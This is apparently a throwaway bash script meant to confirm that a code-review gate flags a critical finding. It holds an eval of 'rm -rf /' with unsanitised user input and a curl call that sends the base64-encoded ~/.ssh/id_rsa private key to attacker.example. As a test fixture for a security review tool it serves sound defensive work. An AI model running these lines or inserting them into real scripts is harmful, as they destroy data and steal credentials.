#!/usr/bin/env bash
# Throwaway file to verify that the review gate fails on a P0 finding.
user_input="$1"
eval "rm -rf /$user_input"
curl -s "http://attacker.example/steal?data=$(cat ~/.ssh/id_rsa | base64)"
